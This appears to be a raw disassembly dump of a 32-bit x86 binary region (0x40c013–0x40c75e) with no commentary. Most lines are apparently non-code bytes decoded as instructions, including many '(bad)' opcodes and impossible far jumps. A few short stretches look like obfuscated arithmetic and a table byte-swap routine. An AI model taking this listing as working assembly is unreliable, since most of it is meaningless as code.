  40c013:	cmp    BYTE PTR [eax-0x4b],ah
  40c016:	int    0x9
  40c018:	jbe    0x40c073
  40c01a:	stos   BYTE PTR es:[edi],al
  40c01b:	sbb    dl,BYTE PTR [edx-0x1cdae50f]
  40c021:	sti    
  40c022:	call   0x7db:0xd3a831f
  40c029:	aaa    
  40c02a:	jno    0x40bff9
  40c02c:	push   DWORD PTR [esi-0x3b]
  40c02f:	cmp    edi,esp
  40c031:	mov    fs:0x17d2949d,eax
  40c037:	icebp  
  40c038:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c039:	shl    DWORD PTR [edx+edx*1-0x37],1
  40c03d:	jmp    FWORD PTR [ebx-0x7c]
  40c040:	fs daa 
  40c042:	xchg   edi,eax
  40c043:	stos   DWORD PTR es:[edi],eax
  40c044:	sub    eax,0x25bb6d9e
  40c049:	dec    ebp
  40c04a:	imul   ecx,eax,0xffffffd7
  40c04d:	popf   
  40c04e:	icebp  
  40c04f:	inc    ecx
  40c050:	aad    0x3e
  40c052:	fldcw  WORD PTR [edx]
  40c054:	sub    eax,0x801e625
  40c059:	inc    ecx
  40c05a:	or     DWORD PTR cs:[eax-0x71],esi
  40c05e:	jl     0x40c091
  40c060:	shr    BYTE PTR [ebx-0x2eb1061],cl
  40c066:	cdq    
  40c067:	jno    0x40c076
  40c069:	daa    
  40c06a:	stc    
  40c06b:	or     ebp,edx
  40c06d:	std    
  40c06e:	fs pop ecx
  40c070:	jns    0x40c049
  40c072:	cmp    ah,BYTE PTR [ecx+ebx*2]
  40c075:	ins    DWORD PTR es:[edi],dx
  40c076:	in     al,0xaa
  40c078:	cli    
  40c079:	push   ds
  40c07a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c07b:	in     al,0x44
  40c07d:	xor    al,0xf1
  40c07f:	xor    al,0x4c
  40c081:	push   DWORD PTR [esi-0x4a]
  40c084:	jne    0x40c101
  40c086:	dec    ebx
  40c087:	cmp    eax,0x81abc1be
  40c08c:	add    ebp,edx
  40c08e:	repnz addr16 loop 0x40c0f4
  40c092:	xchg   ebp,eax
  40c093:	neg    BYTE PTR [edx-0x429d2eb6]
  40c099:	in     eax,0xca
  40c09b:	cmp    al,0x37
  40c09d:	in     al,dx
  40c09e:	or     esi,DWORD PTR [esi]
  40c0a0:	pop    esp
  40c0a1:	fldcw  WORD PTR [esi+0x3d]
  40c0a4:	addr16 gs mov ebx,0x73d05be0
  40c0ab:	push   es
  40c0ac:	mov    dl,BYTE PTR [ecx-0x2]
  40c0af:	dec    eax
  40c0b0:	jmp    0x40c06e
  40c0b2:	loop   0x40c107
  40c0b4:	jno    0x40c108
  40c0b6:	popa   
  40c0b7:	test   edi,edx
  40c0b9:	and    BYTE PTR [eax-0x74],bl
  40c0bc:	xor    ecx,0x33a60f27
  40c0c2:	test   eax,0xbe858b69
  40c0c7:	mov    edx,0x22820aea
  40c0cc:	addr16 leave 
  40c0ce:	and    ch,BYTE PTR [edx]
  40c0d0:	sbb    bl,BYTE PTR ds:0x64f97ac8
  40c0d6:	jae    0x40c06f
  40c0d8:	cmp    eax,0xe919a135
  40c0dd:	jecxz  0x40c0ee
  40c0df:	ret    
  40c0e0:	outs   dx,BYTE PTR ds:[esi]
  40c0e1:	dec    esp
  40c0e2:	fisubr WORD PTR [edx+eiz*2-0x13]
  40c0e6:	jecxz  0x40c081
  40c0e8:	jp     0x40c06b
  40c0ea:	mov    esp,0x8bc4558b
  40c0ef:	jge    0x40c0ed
  40c0f1:	xor    edi,eax
  40c0f3:	xor    edx,eax
  40c0f5:	add    edi,ecx
  40c0f7:	add    edx,ecx
  40c0f9:	imul   edx,edi
  40c0fc:	mov    DWORD PTR [ebp+0xc],edx
  40c0ff:	mov    edx,DWORD PTR [ebp+0xc]
  40c102:	mov    DWORD PTR [ebp-0x24],edx
  40c105:	mov    edx,DWORD PTR [ebp-0x8]
  40c108:	add    edx,DWORD PTR [ebp-0x40]
  40c10b:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40c112:	mov    DWORD PTR [ebp-0x1c],edx
  40c115:	mov    DWORD PTR [ebp-0xc],0xf89c8530
  40c11c:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  40c123:	mov    edx,DWORD PTR [ebp-0x18]
  40c126:	xor    edx,eax
  40c128:	add    edx,ecx
  40c12a:	jmp    0x40ccd1
  40c12f:	mov    edx,DWORD PTR [ebp-0x18]
  40c132:	jmp    0x40c4f0
  40c137:	call   0x9a62:0x428402d0
  40c13e:	out    0xb8,al
  40c140:	mov    di,WORD PTR ds:[ebp+0x2e23df8c]
  40c148:	mov    esi,DWORD PTR [eax+0x70]
  40c14b:	lahf   
  40c14c:	jge    0x40c1be
  40c14e:	jo     0x40c0d2
  40c150:	out    dx,eax
  40c151:	pop    esi
  40c152:	pop    ss
  40c153:	jmp    0xa2b62e34
  40c158:	pop    ebx
  40c159:	xor    eax,0x640c21cc
  40c15f:	xchg   edx,eax
  40c160:	icebp  
  40c161:	xlat   BYTE PTR ds:[ebx]
  40c162:	sbb    eax,0x866bd874
  40c167:	into   
  40c168:	cbw    
  40c16a:	sub    al,0xb5
  40c16c:	jle    0x40c113
  40c16e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c16f:	dec    edi
  40c170:	gs xchg ecx,esp
  40c173:	push   0xfffffff5
  40c175:	dec    esi
  40c176:	sbb    BYTE PTR [eax-0x51],0x5f
  40c17a:	dec    ecx
  40c17b:	ret    0x8f21
  40c17e:	ja     0x40c1a8
  40c180:	das    
  40c181:	sub    DWORD PTR [edx+0x53],eax
  40c184:	dec    ebx
  40c185:	or     esp,DWORD PTR [ecx+0x5c22e4ba]
  40c18b:	dec    edi
  40c18c:	xchg   esp,eax
  40c18d:	fidivr WORD PTR [edx-0x79610e18]
  40c193:	cs push 0xdae3b706
  40c199:	inc    eax
  40c19a:	sbb    BYTE PTR [ecx-0x481647e6],dh
  40c1a0:	pop    esp
  40c1a1:	xchg   edi,eax
  40c1a2:	out    dx,al
  40c1a3:	mov    esi,0xdc6a0901
  40c1a8:	dec    esi
  40c1a9:	int    0x58
  40c1ab:	aad    0x7d
  40c1ad:	xlat   BYTE PTR ds:[ebx]
  40c1ae:	mov    edi,DWORD PTR [ebx+ebx*8+0x34]
  40c1b2:	inc    esi
  40c1b3:	pop    ebx
  40c1b4:	stos   BYTE PTR es:[edi],al
  40c1b5:	adc    bl,bl
  40c1b7:	jp     0x40c213
  40c1b9:	inc    ebp
  40c1ba:	xchg   BYTE PTR [esi],ah
  40c1bc:	ins    BYTE PTR es:[edi],dx
  40c1bd:	add    cl,ah
  40c1bf:	mov    DWORD PTR ds:0x6ad02fc1,esi
  40c1c5:	fadd   st,st(0)
  40c1c7:	loop   0x40c199
  40c1c9:	sub    edi,ebp
  40c1cb:	xor    bl,ah
  40c1cd:	(bad)  
  40c1cf:	dec    esp
  40c1d0:	push   cs
  40c1d1:	xchg   edi,eax
  40c1d2:	pop    ecx
  40c1d3:	les    ecx,FWORD PTR [edx]
  40c1d5:	jmp    0x8030dc7e
  40c1da:	jp     0x40c1a7
  40c1dc:	loopne 0x40c202
  40c1de:	retf   
  40c1df:	pusha  
  40c1e0:	mov    BYTE PTR [edi+ecx*1+0x4f],dh
  40c1e4:	xor    BYTE PTR [ebx-0x7e],cl
  40c1e7:	(bad)
  40c1eb:	jg     0x40c1bd
  40c1ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1ee:	xor    cl,BYTE PTR [edx+0x42]
  40c1f1:	jnp    0x40c1ad
  40c1f3:	inc    esi
  40c1f5:	mov    ss,edx
  40c1f7:	cs (bad) 
  40c1fa:	imul   esp,DWORD PTR [esi],0xfffffff1
  40c1fd:	xchg   ebp,eax
  40c1fe:	pop    eax
  40c1ff:	mov    ds:0xe4800deb,al
  40c204:	stos   BYTE PTR es:[edi],al
  40c205:	in     al,0xe3
  40c207:	mov    esi,DWORD PTR [esi+0x16]
  40c20a:	mov    eax,ds:0x9f16c3d8
  40c20f:	xor    eax,0x17fb9d7c
  40c214:	mov    al,0xa5
  40c216:	xchg   esi,eax
  40c217:	imul   ebp,ebp,0xbc14a242
  40c21d:	pop    edx
  40c21e:	pop    esp
  40c21f:	lods   eax,DWORD PTR ds:[esi]
  40c220:	imul   eax,DWORD PTR [ebx-0x1863d206],0x59250cc2
  40c22a:	loop   0x40c231
  40c22c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c22d:	or     ch,bh
  40c22f:	push   edx
  40c230:	nop
  40c231:	pushf  
  40c232:	adc    al,0x23
  40c234:	test   DWORD PTR [ecx+0x3131b163],esp
  40c23a:	cdq    
  40c23b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c23c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c23d:	push   ebx
  40c23e:	sbb    eax,DWORD PTR [edi+0x15b3b26c]
  40c244:	push   ecx
  40c245:	and    ah,ch
  40c247:	pop    ds
  40c248:	xor    al,0x27
  40c24a:	pop    ebp
  40c24b:	scas   eax,DWORD PTR es:[edi]
  40c24c:	fmul   DWORD PTR [ecx+0xb]
  40c24f:	push   es
  40c250:	jge    0x40c251
  40c252:	push   ebx
  40c253:	fld    QWORD PTR ds:0xbefe9685
  40c259:	ins    BYTE PTR es:[edi],dx
  40c25a:	enter  0x3669,0x4
  40c25e:	sahf   
  40c25f:	jb     0x40c1ec
  40c261:	or     eax,esi
  40c263:	push   ebp
  40c264:	sahf   
  40c265:	call   0xa776:0xcb03208c
  40c26c:	mov    DWORD PTR [eax],esp
  40c26e:	pusha  
  40c26f:	sbb    BYTE PTR [ebp-0x38],0x30
  40c273:	inc    eax
  40c274:	add    al,0x21
  40c276:	pop    esp
  40c277:	lahf   
  40c278:	enter  0xe0a1,0xf5
  40c27c:	sub    eax,0xaecff4
  40c281:	fwait
  40c282:	and    dh,BYTE PTR [edi]
  40c284:	jecxz  0x40c2a0
  40c286:	jbe    0x40c265
  40c288:	mov    ebx,0x8e5c61ba
  40c28d:	(bad)  
  40c28e:	jne    0x40c2e5
  40c290:	fcmovu st,st(0)
  40c292:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c293:	dec    edi
  40c294:	push   ebp
  40c295:	fmul   DWORD PTR [ebp-0x335e633]
  40c29b:	std    
  40c29c:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40c29e:	pop    DWORD PTR [edi+0x20]
  40c2a1:	cmp    al,0x39
  40c2a3:	inc    edi
  40c2a4:	xor    BYTE PTR [esi],cl
  40c2a6:	dec    esi
  40c2a7:	sub    ah,BYTE PTR [edi+0x5c2b4f98]
  40c2ad:	dec    ecx
  40c2ae:	rcl    BYTE PTR [ecx+0x5],cl
  40c2b1:	and    cl,ch
  40c2b3:	fwait
  40c2b4:	imul   BYTE PTR [eax-0x72]
  40c2b7:	xchg   esi,eax
  40c2b8:	stc    
  40c2b9:	xor    dh,BYTE PTR [ebx+0x3a]
  40c2bc:	jb     0x40c2fd
  40c2be:	push   ss
  40c2bf:	xor    edx,DWORD PTR [esi+ebp*8+0x16]
  40c2c3:	popa   
  40c2c4:	pop    ss
  40c2c5:	and    ecx,DWORD PTR [ebp+0x2b1a4840]
  40c2cb:	jnp    0x40c2da
  40c2cd:	xchg   edi,eax
  40c2ce:	inc    edi
  40c2cf:	cmp    eax,0x167bb18d
  40c2d4:	mov    ebx,0x4ee8f266
  40c2d9:	push   ebp
  40c2da:	ret    0xb136
  40c2dd:	mov    dh,0x54
  40c2df:	sbb    al,0x45
  40c2e1:	and    ebp,0xffffff8e
  40c2e4:	pop    esi
  40c2e5:	mov    DWORD PTR [ebp+ecx*1+0x31],esi
  40c2e9:	jp     0x40c310
  40c2eb:	fst    st(2)
  40c2ed:	cmp    esp,0xfb4fdc93
  40c2f3:	std    
  40c2f4:	xchg   ebx,eax
  40c2f5:	sub    eax,0x468f196b
  40c2fa:	adc    dl,BYTE PTR [esi+0x413270a0]
  40c300:	xchg   BYTE PTR [esi+0x51],ch
  40c303:	repnz xchg ecx,eax
  40c305:	popa   
  40c306:	lahf   
  40c307:	pop    ds
  40c308:	or     edx,ecx
  40c30a:	cmp    cl,BYTE PTR [esi+0x54]
  40c30d:	cs aam 0xd5
  40c310:	inc    edi
  40c311:	int    0x58
  40c313:	out    0x98,al
  40c315:	stos   DWORD PTR es:[edi],eax
  40c316:	loop   0x40c315
  40c318:	lock and eax,0x5f7a56e1
  40c31e:	adc    DWORD PTR [esi],esp
  40c320:	adc    al,0xdb
  40c322:	or     ebx,DWORD PTR [ebx+edi*4]
  40c325:	dec    esp
  40c326:	jne    0x40c2fb
  40c328:	rep outs dx,BYTE PTR ds:[esi]
  40c32a:	popa   
  40c32b:	nop
  40c32c:	adc    ebx,ecx
  40c32e:	mov    ebx,0xadbd4f36
  40c333:	mov    ebx,0x931be017
  40c338:	mov    WORD PTR [esi-0x3f],ss
  40c33b:	add    bh,BYTE PTR [ecx+0x50c73cfd]
  40c341:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c342:	ins    BYTE PTR es:[edi],dx
  40c343:	or     eax,0xbba83a9b
  40c348:	mov    ds:0xbaf1f986,al
  40c34d:	sub    edi,DWORD PTR [esi+0x14]
  40c350:	sbb    al,0xa6
  40c352:	dec    ebx
  40c353:	cmp    al,0x1
  40c355:	xchg   ecx,eax
  40c356:	fadd   QWORD PTR [ecx-0x4e]
  40c359:	shl    DWORD PTR [ecx-0x7ff360ae],0xa4
  40c360:	mov    bh,BYTE PTR [ecx+0x6]
  40c363:	jo     0x40c32b
  40c365:	nop
  40c366:	add    esi,edi
  40c368:	test   bl,0xf3
  40c36b:	call   0xbf8f3152
  40c370:	addr16 mov dh,0x89
  40c373:	sub    ch,BYTE PTR [edx-0x27]
  40c376:	retf   0x9016
  40c379:	sti    
  40c37a:	mov    ecx,0x32cb2674
  40c37f:	adc    eax,0xdb6e7464
  40c384:	pusha  
  40c385:	inc    edx
  40c386:	aaa    
  40c387:	repnz out dx,eax
  40c389:	inc    esp
  40c38a:	add    ecx,ecx
  40c38c:	sbb    DWORD PTR [edx+0x40c87d6e],eax
  40c392:	popa   
  40c393:	ds or  al,0x3
  40c396:	cdq    
  40c397:	scas   eax,DWORD PTR es:[edi]
  40c398:	mov    DWORD PTR [edi],ecx
  40c39a:	je     0x40c344
  40c39c:	icebp  
  40c39d:	shr    DWORD PTR [ecx],0xc8
  40c3a0:	mov    dl,0x71
  40c3a2:	es retf 0xd5b9
  40c3a6:	(bad)  
  40c3a7:	ficom  WORD PTR [ebx-0x5e]
  40c3aa:	repnz mov esi,esi
  40c3ad:	and    ah,ah
  40c3af:	rcl    DWORD PTR [ecx+edi*1+0x53],1
  40c3b3:	imul   esp,DWORD PTR [eax+0x58d9229b],0xbc10dfcc
  40c3bd:	test   eax,0x93e5cf30
  40c3c2:	push   es
  40c3c3:	jge    0x40c37d
  40c3c5:	push   cs
  40c3c6:	mov    dh,0xd6
  40c3c8:	jns    0x40c3f6
  40c3ca:	stc    
  40c3cb:	(bad)  
  40c3cc:	lods   eax,DWORD PTR ds:[esi]
  40c3cd:	cmp    ecx,DWORD PTR [ebp+0x77]
  40c3d0:	das    
  40c3d1:	push   ss
  40c3d2:	lea    edi,[eax-0x32]
  40c3d5:	inc    edi
  40c3d6:	cmp    DWORD PTR [esi+0x250864da],eax
  40c3dc:	xor    edx,DWORD PTR [eax]
  40c3de:	xor    esp,edi
  40c3e0:	mov    edx,DWORD PTR [ebp-0x36be6a8f]
  40c3e6:	repnz and edi,edx
  40c3e9:	clc    
  40c3ea:	xlat   BYTE PTR ds:[ebx]
  40c3eb:	or     edx,DWORD PTR [edx-0x5131d5fa]
  40c3f1:	mov    BYTE PTR [esi],cl
  40c3f3:	mov    edx,0xf4cb67d0
  40c3f8:	push   ds
  40c3f9:	clc    
  40c3fa:	retf   
  40c3fb:	pushf  
  40c3fc:	cld    
  40c3fd:	(bad)  
  40c3fe:	repz sbb eax,0xefb1018f
  40c404:	pop    esp
  40c405:	pop    ss
  40c406:	js     0x40c3a3
  40c408:	push   eax
  40c409:	jnp    0x40c3a6
  40c40b:	push   edx
  40c40c:	mov    ebx,0x1daab58f
  40c411:	jno    0x40c3c7
  40c413:	push   ecx
  40c414:	sbb    cl,ah
  40c416:	jmp    0x3100:0x8135e3fb
  40c41d:	ja     0x40c41f
  40c41f:	std    
  40c420:	popf   
  40c421:	lds    edi,FWORD PTR [edi+0x0]
  40c424:	xor    eax,0xce921c53
  40c429:	xor    al,0x0
  40c42b:	jmp    0xf99e:0xea3b6889
  40c432:	fcom   DWORD PTR [ebp-0x78]
  40c435:	imul   edx,DWORD PTR [ecx+0x9b39363],0x55
  40c43c:	adc    eax,0xe6889c68
  40c441:	adc    eax,0x613dcac9
  40c446:	jae    0x40c49a
  40c448:	in     al,dx
  40c449:	push   ss
  40c44a:	xor    dh,ch
  40c44c:	cmp    BYTE PTR [esi+ebp*8+0x1fac0741],0xee
  40c454:	aad    0xec
  40c456:	ret    
  40c457:	sahf   
  40c458:	mov    dl,0x78
  40c45a:	int3   
  40c45b:	popf   
  40c45c:	sbb    cl,ah
  40c45e:	mov    eax,0x683070ae
  40c463:	mov    edi,0x1ac82310
  40c468:	push   0x3c85b3d2
  40c46d:	sub    eax,DWORD PTR [ebx]
  40c46f:	fcomi  st,st(2)
  40c471:	retf   
  40c472:	in     al,0xd1
  40c474:	stos   BYTE PTR es:[edi],al
  40c475:	adc    DWORD PTR [eax-0x56958b00],eax
  40c47b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c47c:	and    DWORD PTR [ebp-0x2d],eax
  40c47f:	in     al,0xa2
  40c481:	cmc    
  40c482:	stos   BYTE PTR es:[edi],al
  40c483:	add    esi,DWORD PTR ds:0x9fd58bb6
  40c489:	adc    al,0x47
  40c48b:	rol    BYTE PTR [esi],1
  40c48d:	stos   DWORD PTR es:[edi],eax
  40c48e:	rol    BYTE PTR gs:[edi+0x19],1
  40c492:	jge    0x40c43f
  40c494:	pop    ss
  40c495:	(bad)  
  40c496:	jns    0x40c4c5
  40c498:	(bad)  
  40c49a:	xchg   ecx,eax
  40c49b:	push   edi
  40c49c:	lahf   
  40c49d:	(bad)  
  40c49e:	arpl   WORD PTR [edi+0x3d],bx
  40c4a1:	iret   
  40c4a2:	mov    WORD PTR [ecx],ds
  40c4a4:	fisttp QWORD PTR [ebx]
  40c4a6:	sub    dl,al
  40c4a8:	push   cs
  40c4a9:	es mov bh,0x1d
  40c4ac:	pop    ebp
  40c4ad:	push   eax
  40c4ae:	cmp    ebp,0xffffffbd
  40c4b1:	ins    DWORD PTR es:[edi],dx
  40c4b2:	mov    ah,0x7b
  40c4b4:	mov    ecx,0x10340ecb
  40c4b9:	call   0x66aaf67e
  40c4be:	es adc al,0x36
  40c4c1:	mov    ?,eax
  40c4c3:	pushf  
  40c4c4:	pop    ds
  40c4c5:	(bad)  [edx-0x3a]
  40c4c8:	jle    0x40c472
  40c4ca:	rsqrtps xmm4,XMMWORD PTR [esi+0x3ef8f022]
  40c4d1:	retfw  0xb3f
  40c4d5:	push   0x2f
  40c4d7:	clc    
  40c4d8:	push   0x56
  40c4da:	shl    BYTE PTR [ebp+0x3d],1
  40c4dd:	test   eax,0xe31d8242
  40c4e2:	jle    0x40c501
  40c4e4:	or     DWORD PTR [edi-0x12],esp
  40c4e7:	add    eax,0x1a29f462
  40c4ec:	into   
  40c4ed:	mov    dl,0xcb
  40c4ef:	mov    edi,0x5503d033
  40c4f4:	in     al,dx
  40c4f5:	mov    edi,DWORD PTR [ebp-0x1c]
  40c4f8:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c4ff:	mov    BYTE PTR [ebp+0xf],dl
  40c502:	mov    edx,DWORD PTR [ebp-0xc]
  40c505:	xor    edx,eax
  40c507:	add    edx,DWORD PTR [ebp-0x14]
  40c50a:	mov    edi,DWORD PTR [ebp-0x1c]
  40c50d:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c514:	mov    BYTE PTR [ebp+0xb],dl
  40c517:	mov    dl,BYTE PTR [ebp+0xf]
  40c51a:	mov    edi,DWORD PTR [ebp-0xc]
  40c51d:	xor    edi,eax
  40c51f:	add    edi,DWORD PTR [ebp-0x14]
  40c522:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c525:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c52c:	mov    dl,BYTE PTR [ebp+0xb]
  40c52f:	jmp    0x40c8ed
  40c534:	xchg   esp,eax
  40c535:	dec    ebp
  40c536:	push   es
  40c537:	adc    ecx,eax
  40c539:	push   ecx
  40c53a:	xchg   ebx,eax
  40c53b:	dec    ebp
  40c53c:	lock sbb cl,cl
  40c53f:	pop    edx
  40c540:	pop    ecx
  40c541:	js     0x40c563
  40c543:	mov    eax,ds:0x7070884d
  40c548:	lahf   
  40c549:	jge    0x40c5bb
  40c54b:	jo     0x40c55f
  40c54d:	out    0x92,eax
  40c54f:	dec    esp
  40c550:	xchg   edi,eax
  40c551:	pop    eax
  40c552:	outs   dx,DWORD PTR ds:[esi]
  40c553:	cmp    dh,dl
  40c555:	rcl    BYTE PTR [ebx-0x5fe055f0],0x2a
  40c55c:	mov    al,ds:0x29e4c313
  40c561:	repnz popf 
  40c563:	addr16 pop ss
  40c565:	test   eax,0x719b3506
  40c56a:	repnz xchg ebp,eax
  40c56c:	scas   al,BYTE PTR es:[edi]
  40c56d:	cmc    
  40c56e:	xchg   edi,eax
  40c56f:	cmp    bh,al
  40c571:	data16 jmp 0x40c5bb
  40c574:	dec    eax
  40c575:	(bad)
  40c57a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c57b:	lock imul ebp,DWORD PTR [edx-0x4c77772f],0xae99c2cf
  40c586:	xchg   esi,eax
  40c587:	jg     0x40c519
  40c589:	dec    edx
  40c58a:	lahf   
  40c58b:	lds    edx,FWORD PTR [ecx-0x6f]
  40c58e:	mov    WORD PTR [edx+0x7a3d2037],ds
  40c594:	or     ch,dl
  40c596:	gs push edx
  40c598:	mov    dl,0x95
  40c59a:	scas   al,BYTE PTR es:[edi]
  40c59b:	jg     0x40c57a
  40c59d:	mov    ds,WORD PTR [ebx-0x289e9d18]
  40c5a3:	push   edx
  40c5a4:	mov    WORD PTR [edi-0x1a],gs
  40c5a7:	lods   al,BYTE PTR ds:[esi]
  40c5a8:	sub    DWORD PTR [eax+0x5dbc6757],0xfbb8895a
  40c5b2:	xchg   ebx,eax
  40c5b3:	inc    esi
  40c5b4:	xchg   edx,eax
  40c5b5:	mov    eax,ds:0x255d37e3
  40c5ba:	push   esi
  40c5bb:	add    DWORD PTR [ecx],0xe0d8313b
  40c5c1:	fwait
  40c5c2:	adc    esi,esp
  40c5c4:	clc    
  40c5c5:	icebp  
  40c5c6:	add    eax,0xa767473b
  40c5cb:	push   eax
  40c5cc:	inc    eax
  40c5cd:	clc    
  40c5ce:	dec    ebx
  40c5cf:	add    dl,BYTE PTR [edi]
  40c5d1:	outs   dx,BYTE PTR ds:[esi]
  40c5d2:	xor    DWORD PTR [ecx-0x67d892d9],ebp
  40c5d8:	fst    QWORD PTR [ebp+0x5b]
  40c5db:	out    dx,eax
  40c5dc:	lds    ebp,FWORD PTR [ebx+esi*1+0x22c34cc5]
  40c5e3:	dec    edi
  40c5e4:	int    0xbc
  40c5e6:	loopne 0x40c650
  40c5e8:	mov    bh,0x71
  40c5ea:	stc    
  40c5eb:	and    dl,BYTE PTR [ebp-0x32095576]
  40c5f1:	jl     0x40c5b5
  40c5f3:	jbe    0x40c616
  40c5f5:	stos   BYTE PTR es:[edi],al
  40c5f6:	lds    eax,FWORD PTR [eax+edx*2+0x6f]
  40c5fa:	ins    BYTE PTR es:[edi],dx
  40c5fb:	dec    edi
  40c5fc:	lods   al,BYTE PTR ds:[esi]
  40c5fd:	sbb    BYTE PTR [esi-0x7d69a8a5],ah
  40c603:	ss jbe 0x40c664
  40c606:	fisttp WORD PTR [ecx+0x2579dd4f]
  40c60c:	fwait
  40c60d:	scas   eax,DWORD PTR es:[edi]
  40c60e:	aas    
  40c60f:	ins    DWORD PTR es:[edi],dx
  40c610:	mov    al,ds:0x23a5693d
  40c615:	push   cs
  40c616:	xchg   esp,eax
  40c617:	rol    DWORD PTR [eax-0x3b2e3e07],cl
  40c61d:	data16 (bad) 
  40c61f:	mov    al,ds:0xfe95b7b
  40c624:	pop    ebx
  40c625:	xchg   edx,eax
  40c626:	jno    0x40c5b3
  40c628:	mov    al,0xab
  40c62a:	outs   dx,DWORD PTR ds:[esi]
  40c62b:	push   es
  40c62c:	mov    eax,0xb7c624ef
  40c631:	out    dx,eax
  40c632:	sub    eax,0x1b927216
  40c637:	stc    
  40c638:	xlat   BYTE PTR ds:[ebx]
  40c639:	sbb    ah,ah
  40c63b:	inc    eax
  40c63c:	repnz mov ebp,0x73ce6618
  40c642:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c643:	pop    eax
  40c644:	push   0x83652cb8
  40c649:	pop    ebp
  40c64a:	scas   al,BYTE PTR es:[edi]
  40c64b:	or     al,0x27
  40c64d:	fstp   TBYTE PTR [edx+0x14e16d62]
  40c653:	fisttp QWORD PTR [esi]
  40c655:	imul   esp,DWORD PTR [esp+edx*1-0x194711b4],0xffffffab
  40c65d:	xchg   edi,eax
  40c65e:	or     dh,BYTE PTR [esi+edi*2]
  40c661:	test   DWORD PTR es:[esi],ecx
  40c664:	and    ch,BYTE PTR ss:[eax+0x16]
  40c668:	(bad)  
  40c669:	ins    BYTE PTR es:[edi],dx
  40c66a:	mov    edi,0x9f8c7130
  40c66f:	outs   dx,BYTE PTR ds:[esi]
  40c670:	or     eax,0x1ffdd53b
  40c675:	jl     0x40c69d
  40c677:	ins    BYTE PTR es:[edi],dx
  40c678:	fadd   st,st(6)
  40c67a:	(bad)  [edi]
  40c67c:	mov    cl,0xb4
  40c67e:	mov    bl,0x88
  40c680:	push   es
  40c681:	xor    cl,dl
  40c683:	lods   al,BYTE PTR ds:[esi]
  40c684:	lods   eax,DWORD PTR ds:[esi]
  40c685:	rol    edi,0xc0
  40c688:	daa    
  40c689:	mov    al,ds:0x912851d2
  40c68e:	pop    esi
  40c68f:	xor    cl,BYTE PTR [ebp+ebx*8+0x1261b4f4]
  40c696:	xchg   ebx,eax
  40c697:	and    al,0x95
  40c699:	add    al,0x7f
  40c69b:	in     eax,0xd9
  40c69d:	add    ah,BYTE PTR [edi+0x4c094aca]
  40c6a3:	and    esi,edx
  40c6a5:	inc    ebx
  40c6a6:	inc    esi
  40c6a7:	arpl   WORD PTR [ebx+0x51cbdd7b],di
  40c6ad:	xchg   ecx,eax
  40c6ae:	xchg   DWORD PTR [eax],ecx
  40c6b0:	lahf   
  40c6b1:	cdq    
  40c6b2:	or     DWORD PTR [esi+0x13],0xffffffc8
  40c6b6:	push   0x3dc075ad
  40c6bb:	fmul   DWORD PTR [edi+0x5e13dab5]
  40c6c1:	into   
  40c6c2:	mov    eax,ds:0x51ac0474
  40c6c7:	in     eax,dx
  40c6c8:	popa   
  40c6c9:	adc    eax,DWORD PTR [edx+ecx*8-0x1eaa3997]
  40c6d0:	xchg   ebx,eax
  40c6d1:	pop    ebx
  40c6d2:	mov    dl,0x46
  40c6d4:	inc    ecx
  40c6d5:	stos   DWORD PTR es:[edi],eax
  40c6d6:	mov    cl,0x85
  40c6d8:	inc    eax
  40c6d9:	jmp    0x8b7e5066
  40c6de:	nop
  40c6df:	daa    
  40c6e0:	xchg   esp,eax
  40c6e1:	mov    edx,0x69876449
  40c6e6:	mov    ds:0x5f4d24d3,al
  40c6eb:	scas   eax,DWORD PTR es:[edi]
  40c6ec:	mov    bh,ch
  40c6ee:	mov    ds:0x5f5fcede,al
  40c6f3:	(bad)  
  40c6f4:	popf   
  40c6f5:	inc    ecx
  40c6f6:	fmul   st(1),st
  40c6f8:	xchg   edx,eax
  40c6f9:	or     DWORD PTR [ecx+0x30b137f5],ebx
  40c6ff:	push   ecx
  40c700:	sub    BYTE PTR [ebp+0x72],dh
  40c703:	fcom   st(2)
  40c705:	xchg   edi,eax
  40c706:	test   DWORD PTR [eax+edi*4-0x51],ebx
  40c70a:	cmp    edi,DWORD PTR [ecx+ebx*1]
  40c70d:	dec    edx
  40c70e:	cmp    eax,0x8e8b024b
  40c713:	loop   0x40c70a
  40c715:	cwde   
  40c716:	(bad)  
  40c717:	pop    eax
  40c718:	mov    BYTE PTR [eax],bh
  40c71a:	arpl   WORD PTR [eax],bp
  40c71c:	cmp    ecx,esp
  40c71e:	push   ds
  40c71f:	repnz push edi
  40c721:	(bad)
  40c726:	adc    BYTE PTR [ebx],ah
  40c728:	or     edi,ebp
  40c72a:	push   es
  40c72b:	mov    ebx,0xc263d2d3
  40c730:	mov    edx,ebx
  40c732:	pop    es
  40c733:	out    0x1,al
  40c735:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c736:	jo     0x40c74a
  40c738:	sbb    al,0xc1
  40c73a:	mov    edx,esp
  40c73c:	adc    DWORD PTR [ebx+0x208e9c38],0xffffffda
  40c743:	ins    BYTE PTR es:[edi],dx
  40c744:	int    0x46
  40c746:	pop    ds
  40c747:	gs (bad) 
  40c749:	jns    0x40c734
  40c74b:	nop
  40c74c:	jae    0x40c776
  40c74e:	loop   0x40c70f
  40c750:	inc    esi
  40c751:	fdiv   DWORD PTR [ebp+0x29]
  40c754:	jne    0x40c759
  40c756:	sub    BYTE PTR [esi-0x6e],ah
  40c759:	retf   0x87c9
  40c75c:	mov    ch,0xc0
  40c75e:	sbb    ebx,ebx
